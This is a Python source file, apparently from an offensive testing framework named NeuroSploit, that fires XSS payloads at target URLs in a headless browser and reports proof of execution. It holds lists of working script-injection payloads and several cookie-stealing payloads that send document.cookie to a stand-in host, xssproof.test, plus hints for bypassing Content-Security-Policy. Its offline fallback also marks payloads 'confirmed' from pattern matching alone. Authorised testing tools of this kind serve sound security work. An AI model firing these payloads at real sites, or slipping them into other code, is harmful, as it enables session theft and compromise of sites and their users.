"""
NeuroSploit v3 - Comprehensive XSS Validator

Validates XSS with multiple proof techniques beyond alert(1):
  - Alert/confirm/prompt popup detection (Playwright)
  - Cookie access verification
  - DOM modification detection
  - Event handler firing confirmation
  - CSP analysis for bypass opportunities
  - Proof payload generation per context
"""

import re
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

try:
    from core.browser_validator import BrowserValidator, HAS_PLAYWRIGHT
except ImportError:
    HAS_PLAYWRIGHT = False
    BrowserValidator = None


@dataclass
class XSSProof:
    """Result of comprehensive XSS validation."""
    confirmed: bool = False
    proof_type: str = ""       # "alert", "cookie", "dom", "event", "fetch", "static"
    detail: str = ""
    payload_used: str = ""
    screenshot: str = ""       # base64 screenshot if browser available
    cookie_accessed: bool = False
    dom_modified: bool = False
    alert_fired: bool = False
    event_fired: bool = False
    csp_bypassed: bool = False
    confidence: float = 0.0    # 0.0 - 1.0


@dataclass
class CSPAnalysis:
    """CSP header analysis result."""
    has_csp: bool = False
    raw_policy: str = ""
    allows_inline: bool = False
    allows_eval: bool = False
    has_wildcards: bool = False
    nonce_based: bool = False
    bypass_possible: bool = False
    bypass_techniques: List[str] = field(default_factory=list)
    weak_directives: List[str] = field(default_factory=list)


class XSSValidator:
    """Validates XSS with multiple proof techniques.

    Goes beyond simple alert(1) detection to prove:
    1. JavaScript execution (alert popup via Playwright)
    2. Cookie theft capability (document.cookie access)
    3. DOM manipulation (innerHTML changes)
    4. Event handler execution
    5. CSP bypass feasibility
    """

    # Proof payloads for different validation goals
    PROOF_PAYLOADS = {
        "alert": [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(document.domain)>",
            "<details open ontoggle=alert(document.domain)>",
        ],
        "cookie": [
            "<script>new Image().src='//xssproof.test/c='+document.cookie</script>",
            "<img src=x onerror=\"fetch('//xssproof.test/c='+document.cookie)\">",
            "<svg/onload=\"new Image().src='//xssproof.test/c='+document.cookie\">",
        ],
        "dom": [
            "<script>document.body.innerHTML+='<div id=xssproof>PWNED</div>'</script>",
            "<img src=x onerror=\"document.body.appendChild(document.createElement('xssproof'))\">",
        ],
        "fetch": [
            "<script>fetch('//xssproof.test/').then(r=>r.text())</script>",
            "<img src=x onerror=\"fetch('//xssproof.test/')\">",
        ],
    }

    # Context-specific proof payloads
    CONTEXT_PAYLOADS = {
        "script_body": [
            "';alert(document.domain)//",
            "\";alert(document.domain)//",
            "*/alert(document.domain)/*",
        ],
        "attribute_value": [
            "\" autofocus onfocus=\"alert(document.domain)",
            "' autofocus onfocus='alert(document.domain)",
            "\" onmouseover=\"alert(document.domain)",
        ],
        "html_body": [
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(document.domain)>",
            "<details open ontoggle=alert(document.domain)>",
        ],
        "javascript_uri": [
            "javascript:alert(document.domain)",
            "javascript:void(alert(document.domain))",
        ],
    }

    async def validate_xss(self, url: str, param: str, payload: str,
                            injection_point: str = "parameter",
                            context: str = "html_body",
                            browser=None) -> XSSProof:
        """Multi-technique XSS validation.

        Tries browser-based validation first, falls back to static analysis.
        """
        proof = XSSProof(payload_used=payload)

        # Browser-based validation (highest confidence)
        if browser and HAS_PLAYWRIGHT:
            try:
                # Check alert popup
                alert_fired = await self.check_alert_popup(browser, url, param, payload)
                if alert_fired:
                    proof.confirmed = True
                    proof.alert_fired = True
                    proof.proof_type = "alert"
                    proof.confidence = 0.95
                    proof.detail = "JavaScript alert() fired in browser"

                # Check cookie access
                if proof.confirmed:
                    cookie_ok = await self.check_cookie_access(browser, url, param, payload)
                    proof.cookie_accessed = cookie_ok
                    if cookie_ok:
                        proof.confidence = 1.0
                        proof.detail += " + cookie accessible"

                # Check DOM modification
                if proof.confirmed:
                    dom_ok = await self.check_dom_modification(browser, url, param, payload)
                    proof.dom_modified = dom_ok

                return proof
            except Exception:
                pass  # Fall through to static analysis

        # Static analysis fallback
        return await self._static_validate(url, param, payload, context)

    async def check_alert_popup(self, browser, url: str, param: str,
                                 payload: str) -> bool:
        """Check if alert/confirm/prompt dialog fires (Playwright)."""
        if not HAS_PLAYWRIGHT or not browser:
            return False

        try:
            page = await browser.new_page()
            dialog_fired = False

            async def handle_dialog(dialog):
                nonlocal dialog_fired
                dialog_fired = True
                await dialog.dismiss()

            page.on("dialog", handle_dialog)

            # Build URL with payload
            if "?" in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"

            await page.goto(test_url, timeout=15000, wait_until="networkidle")
            await page.wait_for_timeout(2000)  # Wait for delayed triggers

            await page.close()
            return dialog_fired
        except Exception:
            return False

    async def check_cookie_access(self, browser, url: str, param: str,
                                   payload: str) -> bool:
        """Verify payload can access document.cookie via Playwright."""
        if not HAS_PLAYWRIGHT or not browser:
            return False

        try:
            page = await browser.new_page()

            # Set a test cookie
            await page.context.add_cookies([{
                "name": "xss_test_cookie",
                "value": "proof_value_12345",
                "url": url,
            }])

            # Navigate with XSS payload
            if "?" in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"

            await page.goto(test_url, timeout=15000, wait_until="networkidle")

            # Check if JS can read cookies
            cookie_value = await page.evaluate("() => document.cookie")
            await page.close()

            return "xss_test_cookie" in str(cookie_value)
        except Exception:
            return False

    async def check_dom_modification(self, browser, url: str, param: str,
                                      payload: str) -> bool:
        """Check if payload modifies DOM."""
        if not HAS_PLAYWRIGHT or not browser:
            return False

        try:
            page = await browser.new_page()

            # Get baseline DOM
            await page.goto(url, timeout=15000, wait_until="networkidle")
            baseline_elements = await page.evaluate("() => document.body.children.length")

            # Navigate with payload
            if "?" in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"

            await page.goto(test_url, timeout=15000, wait_until="networkidle")
            await page.wait_for_timeout(1000)
            test_elements = await page.evaluate("() => document.body.children.length")

            # Check for proof element
            proof_exists = await page.evaluate(
                "() => !!document.getElementById('xssproof')"
            )

            await page.close()
            return proof_exists or (test_elements > baseline_elements + 1)
        except Exception:
            return False

    async def check_event_handler_fire(self, browser, url: str, param: str,
                                        payload: str) -> bool:
        """Check if injected event handler actually fires."""
        if not HAS_PLAYWRIGHT or not browser:
            return False

        try:
            page = await browser.new_page()
            handler_fired = False

            # Intercept console messages as proof of execution
            page.on("console", lambda msg: None)  # Just need the listener

            if "?" in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"

            await page.goto(test_url, timeout=15000, wait_until="networkidle")

            # Try to trigger interactive events
            try:
                await page.mouse.move(100, 100)
                await page.mouse.click(100, 100)
                await page.keyboard.press("Tab")
                await page.wait_for_timeout(1000)
            except Exception:
                pass

            # Check if any XSS proof elements appeared
            proof = await page.evaluate("""() => {
                return window.__xss_proof || false;
            }""")

            await page.close()
            return bool(proof)
        except Exception:
            return False

    def check_csp(self, headers: Dict) -> CSPAnalysis:
        """Analyze Content-Security-Policy for bypass opportunities."""
        csp_header = ""
        for key in headers:
            if key.lower() in ("content-security-policy",
                                "content-security-policy-report-only"):
                csp_header = headers[key]
                break

        if not csp_header:
            return CSPAnalysis(
                has_csp=False,
                bypass_possible=True,
                bypass_techniques=["No CSP header — inline scripts allowed"],
            )

        analysis = CSPAnalysis(has_csp=True, raw_policy=csp_header)
        directives = self._parse_csp(csp_header)

        # Check for unsafe-inline
        script_src = directives.get("script-src", directives.get("default-src", ""))
        if "'unsafe-inline'" in script_src:
            analysis.allows_inline = True
            analysis.weak_directives.append("script-src allows 'unsafe-inline'")

        # Check for unsafe-eval
        if "'unsafe-eval'" in script_src:
            analysis.allows_eval = True
            analysis.weak_directives.append("script-src allows 'unsafe-eval'")

        # Check for wildcards
        if "*" in script_src:
            analysis.has_wildcards = True
            analysis.weak_directives.append("script-src has wildcard (*)")

        # Check for nonce-based
        if "'nonce-" in script_src:
            analysis.nonce_based = True

        # Determine bypass feasibility
        bypass_techniques = []
        if analysis.allows_inline:
            bypass_techniques.append("Inline scripts allowed — standard XSS payloads work")
        if analysis.allows_eval:
            bypass_techniques.append("eval() allowed — construct payload via eval")
        if analysis.has_wildcards:
            bypass_techniques.append("Wildcard script-src — load external JS from any domain")
        if "data:" in script_src:
            bypass_techniques.append("data: URI allowed — <script src='data:text/javascript,alert(1)'>")
        if "blob:" in script_src:
            bypass_techniques.append("blob: URI allowed — create JS blob for execution")
        if not analysis.has_csp or "script-src" not in directives:
            bypass_techniques.append("No script-src directive — falls back to default-src")

        # Check for base-uri (base tag hijacking)
        if "base-uri" not in directives:
            bypass_techniques.append("No base-uri — <base> tag hijacking possible")

        analysis.bypass_possible = len(bypass_techniques) > 0
        analysis.bypass_techniques = bypass_techniques

        return analysis

    def generate_proof_payloads(self, context: str, filters: Dict = None) -> List[str]:
        """Generate proof-specific payloads for validation."""
        payloads = []

        # Context-specific payloads
        ctx_payloads = self.CONTEXT_PAYLOADS.get(context, self.CONTEXT_PAYLOADS["html_body"])
        payloads.extend(ctx_payloads)

        # Add proof payloads
        payloads.extend(self.PROOF_PAYLOADS["alert"])

        # Filter based on known restrictions
        if filters:
            blocked_chars = filters.get("blocked_chars", [])
            if blocked_chars:
                payloads = [p for p in payloads
                            if not any(c in p for c in blocked_chars)]

        return payloads

    # ── Static Analysis (No Browser) ──

    async def _static_validate(self, url: str, param: str, payload: str,
                                context: str) -> XSSProof:
        """Static analysis fallback when Playwright not available."""
        proof = XSSProof(payload_used=payload)

        # Check if payload contains executable patterns
        executable_patterns = [
            (r'<script[^>]*>.*?</script>', "script_tag", 0.80),
            (r'on\w+\s*=\s*["\']?[^"\'>\s]+', "event_handler", 0.75),
            (r'javascript\s*:', "javascript_uri", 0.70),
            (r'<svg[^>]*onload\s*=', "svg_onload", 0.85),
            (r'<img[^>]*onerror\s*=', "img_onerror", 0.85),
            (r'<details[^>]*ontoggle\s*=', "details_ontoggle", 0.80),
        ]

        for pattern, proof_type, confidence in executable_patterns:
            if re.search(pattern, payload, re.IGNORECASE | re.DOTALL):
                proof.confirmed = True
                proof.proof_type = f"static_{proof_type}"
                proof.confidence = confidence
                proof.detail = f"Payload contains executable {proof_type} pattern"
                break

        if not proof.confirmed:
            proof.proof_type = "static_unconfirmed"
            proof.confidence = 0.30
            proof.detail = "Payload reflected but execution not confirmed without browser"

        return proof

    def _parse_csp(self, csp_header: str) -> Dict[str, str]:
        """Parse CSP header into directive dict."""
        directives = {}
        for part in csp_header.split(";"):
            part = part.strip()
            if not part:
                continue
            tokens = part.split(None, 1)
            if tokens:
                directive = tokens[0].lower()
                value = tokens[1] if len(tokens) > 1 else ""
                directives[directive] = value
        return directives
